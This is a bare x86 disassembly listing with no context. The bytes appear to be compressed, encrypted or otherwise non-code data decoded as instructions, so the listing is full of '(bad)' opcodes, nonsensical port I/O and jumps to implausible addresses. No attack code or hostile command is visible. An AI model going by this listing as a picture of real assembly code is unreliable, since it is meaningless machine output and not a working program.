  4227e4:	ret    
  4227e5:	adc    eax,0x427aeb35
  4227ea:	ins    DWORD PTR es:[edi],dx
  4227eb:	ins    BYTE PTR es:[edi],dx
  4227ec:	cmp    ecx,DWORD PTR [ebx]
  4227ee:	dec    ebp
  4227ef:	xchg   ebx,eax
  4227f0:	xchg   edx,eax
  4227f1:	aas    
  4227f2:	jne    0x422852
  4227f4:	jnp    0x4227f8
  4227f6:	lods   al,BYTE PTR ds:[esi]
  4227f7:	mov    BYTE PTR [esi],al
  4227f9:	cld    
  4227fa:	inc    ebp
  4227fb:	xor    al,0x7b
  4227fe:	xchg   DWORD PTR [ebx],ebp
  422800:	add    al,0x89
  422802:	cmp    bl,ah
  422804:	mov    dl,0x80
  422806:	mov    ch,0x1
  422808:	div    BYTE PTR [ebx+0x95186ef]
  42280e:	jns    0x422810
  422810:	mov    edx,0xa
  422815:	add    BYTE PTR [eax],al
  422817:	call   0xf5747226
  42281c:	jge    0x422863
  42281e:	add    esp,esi
  422820:	adc    al,0x96
  422822:	popf   
  422823:	test   DWORD PTR [edx+0x1d],ebp
  422826:	mov    WORD PTR [edx+0x72912a02],ss
  42282c:	(bad)  
  42282d:	cmp    al,BYTE PTR [esi-0x146bfdb6]
  422833:	test   edx,eax
  422835:	mov    ecx,0xa52c2b3
  42283a:	xchg   ecx,eax
  42283b:	jb     0x42283c
  42283d:	fsubr  QWORD PTR [ebx-0x79]
  422840:	inc    edx
  422841:	jmp    0x7c444acc
  422846:	(bad)  
  422847:	cld    
  422848:	ret    0x1fe
  42284b:	sbb    eax,0x109e398
  422850:	xor    eax,0x5b98a9a9
  422855:	mov    al,ds:0x34027646
  42285a:	jge    0x42283a
  42285c:	push   ecx
  42285d:	sbb    BYTE PTR [ebp-0x4e4674b8],dh
  422863:	idiv   eax
  422865:	cmp    eax,0x3f0a5cfa
  42286a:	add    al,0x23
  42286c:	(bad)  
  42286d:	cld    
  42286e:	ret    
  42286f:	push   0xb684e942
  422874:	push   cs
  422875:	data16 lahf 
  422877:	stos   BYTE PTR es:[edi],al
  422878:	add    cl,BYTE PTR [edx+0x4]
  42287b:	add    BYTE PTR [eax],al
  42287d:	add    BYTE PTR [eax],al
  42287f:	add    BYTE PTR [ebp-0x654f16fe],al
  422885:	mov    bh,0x54
  422887:	or     bl,BYTE PTR [ecx+0x1291008b]
  42288d:	fimul  DWORD PTR [ebx]
  42288f:	gs or  eax,0xf9e9fbff
  422895:	jl     0x4228a3
  422897:	jmp    0xe9a83a86
  42289c:	jge    0x422912
  42289e:	or     al,0x4e
  4228a0:	pop    edx
  4228a1:	pop    ds
  4228a2:	pop    gs
  4228a4:	jbe    0x4228e1
  4228a6:	(bad)  
  4228a7:	out    0x76,eax
  4228a9:	add    dh,BYTE PTR [ebp-0x36]
  4228ac:	retf   
  4228ad:	inc    esp
  4228ae:	cld    
  4228af:	cdq    
  4228b0:	leave  
  4228b1:	inc    esp
  4228b2:	or     BYTE PTR [esi-0xe8f01f7],bh
  4228b8:	mov    edi,0x2216fc7c
  4228bd:	scas   eax,DWORD PTR es:[edi]
  4228be:	adc    eax,0xc08376a9
  4228c3:	jge    0x4228a5
  4228c5:	mov    DWORD PTR [ebp-0x3],eax
  4228c8:	fwait
  4228c9:	mov    edi,0x4377b074
  4228ce:	clc    
  4228cf:	push   0xf5c6f6f2
  4228d4:	jbe    0x4228d8
  4228d6:	jae    0x4228ee
  4228d8:	jp     0x4228cf
  4228da:	je     0x42286d
  4228dc:	jno    0x42292b
  4228de:	add    al,0xea
  4228e0:	scas   al,BYTE PTR es:[edi]
  4228e1:	out    0xb9,eax
  4228e3:	pop    ebp
  4228e4:	add    BYTE PTR [eax],al
  4228e6:	add    BYTE PTR [eax],al
  4228e8:	add    BYTE PTR [esi+edi*8-0x7c],ch
  4228ec:	test   eax,0x3cfb23ea
  4228f1:	jge    0x42287d
  4228f3:	add    ch,dl
  4228f5:	mov    ah,0x2
  4228f7:	dec    edi
  4228f8:	cmp    DWORD PTR [esp+edx*1+0x3c],ebp
  4228fc:	div    DWORD PTR [esi+0x7d2c86fe]
  422902:	add    ah,0xdd
  422905:	ja     0x42294f
  422907:	add    al,0x0
  422909:	pop    es
  42290a:	jp     0x42295c
  42290c:	call   0x3f9893
  422911:	dec    esp
  422912:	add    al,0xe9
  422914:	adc    ebp,DWORD PTR [edi+0x1e]
  422917:	inc    edi
  422918:	xchg   ebp,eax
  422919:	sbb    cl,BYTE PTR [edx]
  42291b:	jle    0x422913
  42291d:	mov    al,ds:0xb436fd01
  422922:	ror    BYTE PTR [esi-0x44284402],0x5f
  422929:	sbb    ch,BYTE PTR [edi+0x264c2c2]
  42292f:	dec    edi
  422930:	mov    edi,DWORD PTR [eax-0x10eb187a]
  422936:	mov    dl,0x30
  422938:	(bad)  
  42293a:	cdq    
  42293b:	jnp    0x42293d
  42293d:	dec    esp
  42293e:	add    ah,BYTE PTR [esi+0x2]
  422941:	out    dx,eax
  422942:	lahf   
  422943:	cli    
  422944:	addr16 sbb al,0x2
  422947:	add    BYTE PTR [eax+0x7b],al
  42294a:	mov    WORD PTR [edi],es
  42294c:	mov    BYTE PTR [eax],al
  42294e:	add    BYTE PTR [eax],al
  422950:	add    BYTE PTR [eax],al
  422952:	stc    
  422953:	or     bh,ah
  422955:	adc    eax,0x3bf78c
  42295a:	xchg   edi,eax
  42295b:	or     DWORD PTR [eax+0x7ff61bff],eax
  422961:	popf   
  422962:	or     al,0x2
  422964:	add    BYTE PTR [esi+0xa],dl
  422967:	pop    es
  422968:	adc    BYTE PTR [eax],al
  42296a:	fsubr  QWORD PTR [edi+0x440dbe3]
  422970:	cld    
  422971:	mov    DWORD PTR [ecx-0x6f3cc7ee],edx
  422977:	xchg   ebx,eax
  422978:	sbb    BYTE PTR [ebp+0x4],0xd0
  42297c:	push   esi
  42297d:	adc    BYTE PTR [eax-0x9],ah
  422980:	push   eax
  422981:	jmp    DWORD PTR [ecx-0xa]
  422984:	cld    
  422985:	adc    eax,0x3feecb75
  42298a:	jne    0x42295a
  42298c:	add    edi,edi
  42298e:	mov    ds:0xe85390eb,al
  422993:	es adc al,0x4f
  422996:	(bad)  
  422997:	cs cld 
  422999:	push   ebp
  42299a:	mov    dh,dh
  42299c:	or     edi,esp
  42299e:	add    eax,0xc51202f3
  4229a3:	idiv   BYTE PTR [edi-0x6fd50601]
  4229a9:	cmp    edi,esi
  4229ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229ac:	(bad)  
  4229af:	mov    edi,0x43b1fed9
  4229b4:	test   DWORD PTR [edx+0x0],edi
  4229b7:	add    BYTE PTR [eax],al
  4229b9:	add    BYTE PTR [eax],al
  4229bb:	dec    ebp
  4229bc:	jmp    0x4229bd
  4229be:	lahf   
  4229bf:	jne    0x422975
  4229c1:	fcom   QWORD PTR [eax-0x10]
  4229c4:	mov    ch,0x13
  4229c6:	dec    esi
  4229c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229c8:	sbb    al,0x91
  4229ca:	repz retf 0xf114
  4229ce:	jae    0x422957
  4229d0:	stos   DWORD PTR es:[edi],eax
  4229d1:	inc    DWORD PTR [edx-0x770f80cb]
  4229d7:	mov    al,0xfb
  4229d9:	mov    BYTE PTR [edx+0x21],0x7f
  4229dd:	pop    esi
  4229de:	call   0x1244be61
  4229e3:	xchg   ecx,eax
  4229e4:	stc    
  4229e5:	mov    edi,0x32630ff
  4229ea:	(bad)  
  4229eb:	repz pop ebp
  4229ed:	adc    bh,ah
  4229ef:	push   0x77
  4229f1:	add    eax,0xf0c44afc
  4229f6:	or     eax,DWORD PTR [esi-0x72a1fbd5]
  4229fc:	push   ss
  4229fd:	add    esi,DWORD PTR [edx+0x7d]
  422a00:	lods   al,BYTE PTR ds:[esi]
  422a01:	nop
  422a02:	or     ecx,ebp
  422a04:	add    ebp,eax
  422a06:	and    al,0xba
  422a08:	cld    
  422a09:	outs   dx,DWORD PTR ds:[esi]
  422a0a:	shl    BYTE PTR [ecx-0x4bc2d1a4],0xd
  422a11:	jmp    0x673017c6
  422a16:	pop    ss
  422a17:	adc    BYTE PTR [ecx+0x13],0xaf
  422a1b:	xchg   ecx,eax
  422a1c:	jbe    0x422a03
  422a1e:	js     0x422a20
  422a20:	add    BYTE PTR [eax],al
  422a22:	add    BYTE PTR [eax],al
  422a24:	pop    es
  422a25:	out    dx,al
  422a26:	adc    DWORD PTR [edi+0x77],0xba7fe902
  422a2d:	jne    0x4229de
  422a2f:	sub    edi,0xfffffff8
  422a32:	out    0x90,eax
  422a34:	ja     0x422a9e
  422a36:	in     eax,0xa6
  422a38:	dec    ebp
  422a39:	add    esi,esi
  422a3b:	push   es
  422a3c:	pop    ecx
  422a3d:	jbe    0x422a18
  422a3f:	jp     0x422a08
  422a41:	or     dh,BYTE PTR [edx]
  422a43:	nop
  422a44:	inc    edx
  422a45:	cld    
  422a46:	mov    ah,0x17
  422a48:	pop    edx
  422a49:	or     ah,BYTE PTR ds:0x29873906
  422a4f:	pop    DWORD PTR [esi-0x2ec6305]
  422a55:	ret    
  422a56:	pop    esi
  422a57:	xor    eax,0x605b91a
  422a5c:	sbb    DWORD PTR [edi-0x508970d7],eax
  422a62:	call   0xe729e81
  422a67:	push   es
  422a68:	xchg   esi,ebp
  422a6a:	sar    ebx,1
  422a6c:	out    0xfc,al
  422a6e:	fiadd  DWORD PTR ds:0x3c1f267
  422a74:	add    ebp,edi
  422a76:	retf   0xb57a
  422a79:	pop    ebx
  422a7a:	and    ebp,DWORD PTR [ecx+0x3edc0b3]
  422a80:	xchg   DWORD PTR es:[eax],eax
  422a83:	lds    eax,FWORD PTR [esi]
  422a85:	dec    ebp
  422a86:	push   0xc1
  422a8b:	add    BYTE PTR [eax],al
  422a8d:	out    dx,al
  422a8e:	cmp    eax,DWORD PTR [eax]
  422a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a91:	retf   0xe4b
  422a94:	sub    DWORD PTR [ecx-0x7d],edi
  422a97:	inc    ebp
  422a98:	xchg   ecx,eax
  422a99:	sub    bh,BYTE PTR [ebx-0x3da0148b]
  422a9f:	dec    edi
  422aa0:	push   ds
  422aa1:	stc    
  422aa2:	out    dx,eax
  422aa3:	jns    0x422ace
  422aa5:	jns    0x422af9
  422aa7:	das    
  422aa8:	jbe    0x422b1a
  422aaa:	adc    al,al
  422aac:	(bad)  [esi-0x5be7905]
  422ab2:	fnstenv [ebp+eiz*4+0xe]
  422ab6:	dec    DWORD PTR [edi]
  422ab8:	jmp    0x4e4a9333
  422abd:	xor    ch,bl
  422abf:	(bad)  
  422ac0:	stos   BYTE PTR es:[edi],al
  422ac1:	jbe    0x422ac0
  422ac3:	adc    eax,0x3b4715
  422ac8:	bound  edi,QWORD PTR [ecx-0x80]
  422acb:	sti    
  422acc:	mov    ch,0x1d
  422ace:	push   ebp
  422acf:	lea    ebp,[edx+esi*2+0x785f534b]
  422ad6:	push   cs
  422ad7:	add    cl,ch
  422ad9:	or     al,0xfb
  422adb:	mov    BYTE PTR [edx+edi*2-0x4e933002],dl
  422ae2:	jo     0x422aee
  422ae4:	jb     0x422ab8
  422ae6:	div    BYTE PTR [edi]
  422ae8:	das    
  422ae9:	add    BYTE PTR [edx-0x3e],al
  422aec:	daa    
  422aed:	jne    0x422af4
  422aef:	add    dl,dl
  422af1:	add    BYTE PTR [eax],al
  422af3:	add    BYTE PTR [eax],al
  422af5:	add    al,bh
  422af7:	push   ebp
  422af8:	call   0xfc3f9064
  422afd:	aaa    
  422afe:	jo     0x422b70
  422b00:	clc    
  422b01:	into   
  422b02:	rcl    DWORD PTR [esi+0xe],cl
  422b05:	add    BYTE PTR [esi+eax*1-0x568c3877],cl
  422b0c:	ret    0x69c3
  422b0f:	jns    0x422af8
  422b11:	push   ecx
  422b12:	dec    edi
  422b13:	pushf  
  422b14:	test   DWORD PTR [eax],0x642e797a
  422b1a:	test   eax,0x1156fbbe
  422b1f:	mov    esp,0x67650f7
  422b24:	data16 and dh,bl
  422b27:	mov    eax,DWORD PTR [ebx]
  422b29:	(bad)  
  422b2a:	jmp    0x3ec7:0x5475bb7b
  422b31:	cld    
  422b32:	mov    cl,al
  422b34:	cld    
  422b35:	adc    eax,0x3bf18c
  422b3a:	fisttp WORD PTR ds:0x7b847579
  422b40:	ds cld 
  422b42:	or     al,0x8a
  422b44:	xor    eax,ebp
  422b46:	dec    ebx
  422b47:	jae    0x422b46
  422b49:	inc    edi
  422b4b:	or     eax,0xd708ff7e
  422b50:	xchg   BYTE PTR [ebp-0x70],al
  422b53:	mov    ch,0x54
  422b55:	push   0x2e
  422b57:	jmp    FWORD PTR [ebp+0x8]
  422b5a:	add    BYTE PTR [eax],al
  422b5c:	add    BYTE PTR [eax],al
  422b5e:	add    BYTE PTR [ebx+0x1df88027],dl
  422b64:	mov    DWORD PTR [ebx],ecx
  422b66:	mov    ebx,ecx
  422b68:	icebp  
  422b69:	jle    0x422b2b
  422b6b:	cwde   
  422b6c:	clc    
  422b6d:	mov    BYTE PTR [ebp+0x10],cl
  422b70:	jl     0x422b75
  422b72:	mov    ebx,DWORD PTR [ebx+0x1a]
  422b75:	add    edx,DWORD PTR [edi+0x74]
  422b78:	lock nop
  422b7a:	(bad)  
  422b7b:	adc    esi,DWORD PTR [edx]
  422b7d:	rcr    BYTE PTR [edi-0x4e],0xc7
  422b81:	mov    edx,0x58eb7508
  422b86:	xchg   ecx,edx
  422b88:	cmp    al,BYTE PTR [ebx+0x59ebd965]
  422b8e:	xchg   DWORD PTR [eax+0x7540194b],ecx
  422b94:	sbb    BYTE PTR [ecx+0x6a1bc145],dl
  422b9a:	add    BYTE PTR [edx+0x28fb1016],bh
  422ba0:	repz (bad) 
  422ba2:	shl    al,cl
  422ba4:	stos   DWORD PTR es:[edi],eax
  422ba5:	jns    0x422be2
  422ba7:	pop    esp
  422ba8:	push   ds
  422ba9:	add    BYTE PTR [ebp+0x5f],dh
  422bac:	sbb    BYTE PTR [ecx],0x0
  422baf:	sub    ax,WORD PTR [edi+edi*2]
  422bb3:	(bad)  
  422bb4:	cmc    
  422bb5:	js     0x422be2
  422bb7:	out    dx,al
  422bb8:	push   ds
  422bb9:	add    BYTE PTR [eax+0x2373edb5],al
  422bbf:	pop    ebp
  422bc0:	jl     0x422b54
  422bc2:	cli    
  422bc3:	add    BYTE PTR [eax],al
  422bc5:	add    BYTE PTR [eax],al
  422bc7:	add    BYTE PTR [edx+0x64],ch
  422bca:	cld    
  422bcb:	test   DWORD PTR [edx-0x31],esp
  422bce:	sbb    ecx,DWORD PTR [ebp+0x53543fb0]
  422bd4:	push   edx
  422bd5:	scas   al,BYTE PTR es:[edi]
  422bd6:	or     edi,ebx
  422bd8:	shl    bl,0xfe
  422bdb:	shl    dh,cl
  422bdd:	xor    al,BYTE PTR ds:0xc7747175
  422be3:	out    0x7d,eax
  422be5:	mov    al,0xe7
  422be7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422be8:	pop    es
  422be9:	adc    edi,edi
  422beb:	das    
  422bec:	xor    eax,0x37c961a8
  422bf1:	repz call DWORD PTR [esi+edi*8+0x6]
  422bf6:	push   ebp
  422bf7:	push   ecx
  422bf8:	test   BYTE PTR [ebp-0x6e59ff05],0x56
  422bff:	sti    
  422c00:	add    BYTE PTR [edx],0xf5
  422c03:	add    cl,BYTE PTR [ebx+0x7543f7e6]
  422c09:	stc    
  422c0a:	pop    esp
  422c0b:	sbb    dl,bh
  422c0d:	cs xchg ebp,eax
  422c0f:	sbb    BYTE PTR ds:0xdb6e02,dh
  422c15:	aas    
  422c16:	mov    ebp,0xe56ece53
  422c1b:	ret    0xf8be
  422c1e:	jmp    0x1d3b5226
  422c23:	or     al,0xae
  422c25:	iret   
  422c26:	fs ret 
  422c28:	and    BYTE PTR [esi-0x6e],dl
  422c2b:	sbb    BYTE PTR [eax],al
  422c2d:	add    BYTE PTR [eax],al
  422c2f:	add    BYTE PTR [eax],al
  422c31:	jne    0x422c48
  422c33:	sub    DWORD PTR [edx+ebx*1],eax
  422c36:	cli    
  422c37:	(bad)  
  422c38:	js     0x422c5e
  422c3a:	lea    esp,[eax+eax*1]
  422c3d:	dec    ebp
  422c3e:	(bad)  
  422c40:	dec    edx
  422c41:	ret    0xf541
  422c44:	dec    ecx
  422c45:	lea    ebx,[ecx]
  422c47:	ja     0x422c4a
  422c49:	jno    0x422bd5
  422c4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c4c:	sti    
  422c4d:	lock ret 0x3ddd
  422c51:	mov    ds:0x69784a53,al
  422c56:	push   edx
  422c57:	inc    edx
  422c58:	sbb    BYTE PTR [ecx+0x4e03a913],bl
  422c5e:	outs   dx,BYTE PTR ds:[esi]
  422c5f:	fst    QWORD PTR [eax+0x299f6b8]
  422c65:	ret    
  422c66:	cli    
  422c67:	mov    edx,0x1a0aab02
  422c6c:	fldcw  WORD PTR [edx-0x7b871706]
  422c72:	mov    esp,DWORD PTR [ebx+edx*1+0x87dc2f0]
  422c79:	cli    
  422c7a:	inc    ebp
  422c7b:	std    
  422c7c:	mov    edi,DWORD PTR [ebp-0x75]
  422c7f:	add    BYTE PTR [esi+edi*8-0x7d11f921],ch
  422c86:	cli    
  422c87:	call   0xfc3f357f
  422c8c:	sbb    dh,BYTE PTR [ecx-0x51cda5a5]
  422c92:	mov    eax,0xe910
  422c97:	add    BYTE PTR [eax],al
  422c99:	add    BYTE PTR [ebx+0x7f],al
  422c9c:	in     al,dx
  422c9d:	push   0xffffffc5
  422c9f:	push   es
  422ca0:	dec    edi
  422ca1:	pop    ss
  422ca2:	clc    
  422ca3:	sub    eax,0x236dc64
  422ca8:	push   ebx
  422ca9:	inc    ebx
  422caa:	ins    DWORD PTR es:[edi],dx
  422cab:	dec    edi
  422cac:	lea    ebp,[esi*2-0x52db72af]
  422cb3:	push   edx
  422cb4:	data16 cld 
  422cb6:	jne    0x422d28
  422cb8:	or     BYTE PTR [eax+0x3a],ah
  422cbb:	idiv   bl
  422cbd:	lahf   
  422cbe:	add    BYTE PTR [esi],dh
  422cc0:	nop
  422cc1:	aam    0x36
  422cc3:	add    ah,bh
  422cc5:	shl    ecx,cl
  422cc7:	cmp    eax,0x6eb164f4
  422ccc:	and    DWORD PTR [edx+eax*8-0xa],esi
  422cd0:	push   ecx
  422cd1:	ins    BYTE PTR es:[edi],dx
  422cd2:	mov    edx,0x8bc351ee
  422cd7:	push   edx
  422cd8:	mov    DWORD PTR [esi+ebp*2+0x74455d89],esp
  422cdf:	sar    ebx,cl
  422ce1:	mov    ah,0x7e
  422ce3:	mov    DWORD PTR [ebp+0x31],eax
  422ce6:	je     0x422cb6
  422ce8:	jg     0x422c96
  422cea:	add    dh,BYTE PTR ds:[ebp+0x41]
  422cee:	xchg   esp,eax
  422cef:	pop    esp
  422cf0:	push   edi
  422cf1:	xor    BYTE PTR [ebx],dh
  422cf3:	(bad)  
  422cf4:	(bad)  
  422cf5:	mov    ebx,0xb851e5f1
  422cfa:	sbb    eax,0xc3d
  422cff:	add    BYTE PTR [eax],al
  422d01:	add    BYTE PTR [eax],al
  422d03:	sbb    al,0x3
  422d05:	add    BYTE PTR [eax-0x80],ah
  422d08:	jmp    FWORD PTR [edx]
  422d0a:	shl    BYTE PTR [edi+0x72],0x7b
  422d0e:	gs add al,0x3
  422d11:	dec    ebx
  422d12:	push   esi
  422d13:	xor    BYTE PTR [si-0x63eb],dh
  422d18:	(bad)  
  422d19:	popa   
  422d1a:	add    BYTE PTR [ecx+0x40],bl
  422d1d:	clc    
  422d1e:	push   eax
  422d1f:	cmp    DWORD PTR [eax-0x9],eax
  422d22:	push   eax
  422d23:	mov    ebx,0x81ff0c6f
  422d28:	push   es
  422d29:	not    esi
  422d2b:	push   ecx
  422d2c:	ret    
  422d2d:	jne    0x422d75
  422d2f:	or     edx,DWORD PTR [eax]
  422d31:	add    BYTE PTR [ebx],dl
  422d33:	pop    esp
  422d34:	(bad)  
  422d35:	jp     0x422d2f
  422d37:	push   esi
  422d38:	outs   dx,DWORD PTR ds:[esi]
  422d39:	xor    ecx,DWORD PTR [ebx+0x7440f651]
  422d3f:	shr    edx,0x29
  422d42:	xchg   ecx,eax
  422d43:	cli    
  422d44:	add    DWORD PTR [eax+0x74d611d8],ecx
  422d4a:	sub    dh,BYTE PTR [esi-0x2]
  422d4d:	mov    WORD PTR [ebp+0x4],es
  422d50:	push   ebx
  422d51:	dec    ebx
  422d52:	call   DWORD PTR [ecx+0x6]
  422d55:	div    DWORD PTR [ebp+0x64]
  422d58:	add    ecx,edi
  422d5a:	add    esp,0x0
  422d5d:	jne    0x422d6f
  422d5f:	xlat   BYTE PTR ds:[ebx]
  422d60:	cmp    al,0x10
  422d62:	test   DWORD PTR [ebp+ebp*2+0x8b05],ebx
  422d69:	add    BYTE PTR [eax],al
  422d6b:	add    BYTE PTR [ecx],bl
  422d6d:	cli    
  422d6e:	mov    DWORD PTR [eax],ecx
  422d70:	xlat   BYTE PTR ds:[ebx]
  422d71:	mov    esi,0xe9df08e3
  422d76:	sub    al,0x91
  422d78:	pop    edx
  422d79:	add    dh,BYTE PTR [eax]
  422d7b:	shr    dl,0x56
  422d7e:	leave  
  422d7f:	ret    0xdf75
  422d82:	call   DWORD PTR [esi+ebp*8-0x9]
  422d86:	push   ecx
  422d87:	dec    edi
  422d88:	inc    esi
  422d89:	and    BYTE PTR [esi],dh
  422d8b:	pop    ebp
  422d8c:	gs je  0x422d9f
  422d8f:	xchg   DWORD PTR [eax-0x13e7791d],edi
  422d95:	xchg   ebx,eax
  422d96:	add    ecx,DWORD PTR [ecx+0x1aff34d]
  422d9c:	ficom  WORD PTR [ecx+0x52]
  422d9f:	push   ebx
  422da0:	out    dx,al
  422da1:	push   cs
  422da2:	adc    DWORD PTR fs:0x264f4eeb,esi
  422da9:	sbb    bl,bh
  422dab:	jne    0x422e12
  422dad:	mov    ah,0x79
  422daf:	or     al,0x26
  422db1:	inc    ebx
  422db2:	in     eax,dx
  422db3:	std    
  422db4:	jne    0x422da1
  422db6:	cli    
  422db7:	sar    esi,cl
  422db9:	fwait
  422dba:	aaa    
  422dbb:	out    dx,eax
  422dbc:	sub    eax,ebp
  422dbe:	nop
  422dbf:	inc    edx
  422dc0:	je     0x422dfd
  422dc2:	in     al,dx
  422dc3:	rol    BYTE PTR ds:0x3889fb86,0x7f
  422dca:	aaa    
  422dcb:	mov    edi,0x4f4ed501
  422dd0:	add    BYTE PTR [eax],al
  422dd2:	add    BYTE PTR [eax],al
  422dd4:	add    BYTE PTR [ebx],ch
  422dd6:	sbb    edi,ebx
  422dd8:	jne    0x422e3f
  422dda:	fs jns 0x422de9
  422ddd:	(bad)  
  422dde:	shr    esp,cl
  422de0:	std    
  422de1:	jne    0x422dce
  422de3:	cli    
  422de4:	rcr    DWORD PTR [esi+0x5a0c7825],cl
  422dea:	into   
  422deb:	sti    
  422dec:	call   0xfc3c88ff
  422df1:	xchg   DWORD PTR [ebx],ebp
  422df3:	out    0x12,eax
  422df5:	out    dx,al
  422df6:	popf   
  422df7:	sti    
  422df8:	xchg   DWORD PTR [eax+0x641c87e3],esi
  422dfe:	add    dh,BYTE PTR [eax+0xc]
  422e01:	repnz inc esi
  422e03:	stc    
  422e04:	mov    WORD PTR [ebp+0x6d745ffe],gs
  422e0a:	mov    dl,0xe8
  422e0c:	pop    esi
  422e0d:	scas   eax,DWORD PTR es:[edi]
  422e0e:	pop    ecx
  422e0f:	xor    dl,al
  422e11:	jns    0x422e15
  422e13:	outs   dx,BYTE PTR ds:[esi]
  422e14:	push   eax
  422e15:	pop    ecx
  422e16:	or     al,BYTE PTR [ecx]
  422e18:	mov    BYTE PTR [ebp+esi*8-0x16],bh
  422e1c:	mov    BYTE PTR [ebp-0x4ace1286],dh
  422e22:	call   0x6e208212
  422e27:	or     eax,0x56dde10
  422e2c:	adc    ch,bl
  422e2e:	dec    esp
  422e2f:	ret    0xcefe
  422e32:	mov    edi,0x892803f1
  422e37:	lds    eax,FWORD PTR [edx+0x0]
  422e3d:	add    cl,cl
  422e3f:	or     eax,0x6a465616
  422e44:	cdq    
  422e45:	adc    eax,0x14110235
  422e4a:	xchg   BYTE PTR [edx-0x17],al
  422e4d:	jmp    0x422ec7
  422e4f:	ror    BYTE PTR [edx-0x49260502],cl
  422e55:	cmc    
  422e56:	inc    edx
  422e57:	aam    0xf5
  422e59:	jnp    0x422e55
  422e5b:	add    BYTE PTR [ebx],bl
  422e5d:	push   ebx
  422e5e:	jle    0x422df1
  422e60:	ins    DWORD PTR es:[edi],dx
  422e61:	add    esi,DWORD PTR [ebp+0x2]
  422e64:	outs   dx,BYTE PTR ds:[esi]
  422e65:	add    al,bh
  422e67:	dec    edi
  422e68:	pop    edx
  422e69:	xchg   ebx,eax
  422e6a:	xchg   ebp,eax
  422e6b:	add    ecx,ebp
  422e6d:	add    esi,edx
  422e6f:	(bad)  
  422e70:	mov    esi,0x59f3c2fe
  422e75:	sbb    esi,DWORD PTR [edx+eax*1-0x17]
  422e79:	mov    al,BYTE PTR [edx+0x4e]
  422e7c:	add    BYTE PTR [edx-0x17ef6cc5],bl
  422e82:	jbe    0x422e86
  422e84:	xchg   edx,ebp
  422e86:	add    eax,0x8eb8fc46
  422e8b:	add    dl,BYTE PTR [ebx]
  422e8d:	test   eax,0xf9fb4376
  422e92:	std    
  422e93:	ret    0xc475
  422e96:	in     eax,0x3d
  422e98:	in     al,dx
  422e99:	cdq    
  422e9a:	add    ecx,DWORD PTR [esi]
  422e9c:	cmp    al,0xda
  422e9e:	mov    dh,0x2
  422ea0:	data16 loop 0x422ea3
  422ea3:	add    BYTE PTR [eax],al
  422ea5:	add    BYTE PTR [eax],al
  422ea7:	dec    esi
  422ea8:	pusha  
  422ea9:	mov    DWORD PTR [eiz*8-0x5a06138d],ebp
  422eb0:	ret    0x6062
  422eb3:	xor    ch,dh
  422eb5:	xchg   DWORD PTR [esi*2+0x7572088a],esp
  422ebc:	test   BYTE PTR [ebp-0x33],dh
  422ebf:	sbb    bl,BYTE PTR [esi+0x6c6541a5]
  422ec5:	inc    eax
  422ec6:	jmp    0x793dcc11
  422ecb:	xor    DWORD PTR [ecx],eax
  422ecd:	add    cl,ch
  422ecf:	in     eax,dx
  422ed0:	cmp    eax,0x526962fc
  422ed5:	sti    
  422ed6:	cmp    BYTE PTR [ecx-0x4b8da5a9],al
  422edc:	dec    ebx
  422edd:	leave  
  422ede:	stos   BYTE PTR es:[edi],al
  422edf:	sub    bh,BYTE PTR [ebx-0x14]
  422ee2:	push   0xffffff85
  422ee4:	sbb    cl,BYTE PTR [edi+0x17]
  422ee7:	enter  0x45c0,0x66
  422eeb:	jno    0x422ed7
  422eed:	dec    ebx
  422eee:	pop    esi
  422eef:	pusha  
  422ef0:	test   DWORD PTR [edi+0x74caf231],0xe83d03c8
  422efa:	add    ah,ch
  422efc:	cmc    
  422efd:	adc    eax,0x3f1f3c
  422f02:	push   0x54
  422f04:	push   edi
  422f05:	div    DWORD PTR [ebp+0x14]
  422f08:	pop    ebp
  422f09:	mov    DWORD PTR [ebp+0x0],eax
  422f0c:	add    BYTE PTR [eax],al
  422f0e:	add    BYTE PTR [eax],al
  422f10:	test   ch,dh
  422f12:	adc    eax,0x3f1f44
  422f17:	mov    ecx,ecx
  422f19:	out    dx,al
  422f1a:	test   eax,eax
  422f1c:	call   0x8145b257
  422f21:	inc    ebx
  422f22:	clc    
  422f23:	push   ecx
  422f24:	(bad)  
  422f25:	repnz adc BYTE PTR [ebx-0x178a7c00],cl
  422f2c:	cmp    DWORD PTR [ebx-0xa06ac5b],ebx
  422f32:	nop
  422f33:	call   0x85422e04
  422f38:	or     al,0x6c
  422f3a:	add    esp,DWORD PTR [esi+0x5f]
  422f3d:	je     0x422f37
  422f3f:	dec    DWORD PTR [ecx+0x345be0a]
  422f45:	add    BYTE PTR [ebp-0x8b14bbb],cl
  422f4b:	adc    eax,0x401154
  422f50:	sbb    al,0x74
  422f52:	test   DWORD PTR [eax],0x3830689
  422f58:	pop    edi
  422f59:	cmc    
  422f5a:	push   eax
  422f5b:	or     BYTE PTR [edi+0x75e57d9],ch
  422f61:	ret    0xc953
  422f64:	into   
  422f65:	cli    
  422f66:	call   DWORD PTR [edi+edx*1-0x1d]
  422f6a:	push   ecx
  422f6b:	mov    ebx,DWORD PTR [edx-0x7f]
  422f6e:	dec    ebp
  422f6f:	cld    
  422f70:	sub    eax,0x50f758
  422f75:	add    BYTE PTR [eax],al
  422f77:	add    BYTE PTR [eax],al
  422f79:	inc    esp
  422f7a:	mov    eax,eax
  422f7c:	je     0x422ff3
  422f7e:	fild   WORD PTR [eax-0x7723ae9b]
  422f84:	add    ah,BYTE PTR [ebx-0x11f7b0b8]
  422f8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f8b:	sti    
  422f8c:	leave  
  422f8d:	(bad)
  422f92:	mov    WORD PTR [ebp-0x79],ss
  422f95:	mov    al,ds:0x88fb54f3
  422f9a:	call   DWORD PTR [eax]
  422f9c:	inc    eax
  422f9d:	jne    0x423001
  422f9f:	inc    edx
  422fa0:	cld    
  422fa1:	cmc    
  422fa2:	sar    bh,0x86
  422fa5:	cmp    esi,DWORD PTR [eax+0x33]
  422fa8:	xchg   BYTE PTR [ebx+0x67],ah
  422fab:	fdiv   DWORD PTR [ecx+ecx*2-0x3c]
  422faf:	hlt    
  422fb0:	xchg   edx,ecx
  422fb2:	fdiv   DWORD PTR [si-0x7e]
  422fb6:	jne    0x422fd2
  422fb8:	test   BYTE PTR [esi+0x1b0b2457],bh
  422fbe:	loopne 0x422fd1
  422fc0:	or     edx,DWORD PTR [ebx]
